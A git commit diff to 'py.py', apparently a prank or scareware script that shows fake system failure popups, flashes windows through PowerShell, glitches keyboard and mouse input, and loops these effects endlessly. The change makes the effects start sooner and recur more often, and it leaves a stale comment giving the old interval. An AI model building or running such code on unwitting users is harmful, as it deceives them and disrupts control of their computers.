6212c22e888488bbb02659861fcc097fedfce9fd
JJcoded <jjcoded.mail@gmail.com>
2025-03-19 11:42:08 +1000

    Update py.py

--- py.py
+++ py.py
@@ -7,7 +7,7 @@ import webbrowser
 import pyautogui
 
 # Wait 10 seconds before starting (suspense)
-time.sleep(10)
+time.sleep(5)
 
 # Fake system failure popups
 def fake_errors():
@@ -31,9 +31,9 @@ def screen_glitch():
     os.system("powershell -Command \"(Get-Process -Id $PID).MainWindowHandle | ForEach-Object {Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class WinAPI { [DllImport(\\\"user32.dll\\\")] public static extern int FlashWindowEx(IntPtr hwnd, ref FLASHWINFO pwfi); } public struct FLASHWINFO { public uint cbSize; public IntPtr hwnd; public uint dwFlags; public uint uCount; public uint dwTimeout; }' -Language CSharp; $fw = New-Object FLASHWINFO; $fw.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($fw); $fw.hwnd = $_; $fw.dwFlags = 3; $fw.uCount = 10; $fw.dwTimeout = 0; [WinAPI]::FlashWindowEx([ref]$fw)}\"")
 
 # Loop the horror effects at random times
-time.sleep(40)
+time.sleep(50)
 while True:
-    time.sleep(random.randint(20, 60))  # Random intervals between 20s-60s
+    time.sleep(random.randint(5, 15))  # Random intervals between 20s-60s
     random.choice([
         fake_errors,
         keyboard_mouse_glitch,
